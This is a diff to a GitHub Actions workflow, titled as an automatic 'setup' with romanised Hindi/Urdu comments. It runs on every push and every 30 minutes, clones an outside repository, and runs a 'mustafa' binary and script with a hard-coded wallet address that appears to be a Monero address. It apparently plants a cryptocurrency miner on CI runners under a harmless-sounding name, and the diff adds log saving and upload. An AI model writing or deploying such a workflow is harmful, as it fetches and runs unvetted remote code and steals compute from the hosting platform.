@@ -1,11 +1,11 @@
-name: 🔄 Auto Mustu Setup (No Manual Needed)
+name: 🔄 Auto Mustu Setup (Fixed)
 
 on:
   push:
     branches: [ main, master ]
   schedule:
-    - cron: '*/30 * * * *'   # Har 30 minute mein run hoga
-  workflow_dispatch:          # Optional - agar kabhi manually run karna ho
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
 
 jobs:
   auto-run:
@@ -20,34 +20,36 @@ jobs:
       with:
         python-version: '3.10'
     
+    # ⚠️ IMPORTANT: apt update hata diya - zaroorat nahi
     - name: 🚀 Auto Clone & Run Mustu
       run: |
-        echo "Starting automatic mustu setup..."
+        echo "🚀 Starting automatic mustu setup..."
+        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
         
         # Clone karo
         git clone https://github.com/thumpingpp/mustu-setup.git
         
         # CD aur permissions
         cd mustu-setup
-        
-        # mustafa ko executable banao
         chmod +x mustafa
         
-        # Direct auto run with fixed wallet
+        # Run command
         python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
         
         echo "✅ Auto run completed at $(date)"
     
-    - name: 💾 Save Run Status
+    - name: 💾 Save Status
       run: |
-        echo "Last run: $(date)" > last_run.txt
-        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
+        mkdir -p logs
+        echo "Last run: $(date)" > logs/last_run.txt
+        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> logs/last_run.txt
     
     - name: 📤 Upload Logs
       uses: actions/upload-artifact@v4
+      if: always()
       with:
         name: auto-run-logs
         path: |
           mustu-setup/*.log
-          last_run.txt
+          logs/
         retention-days: 5
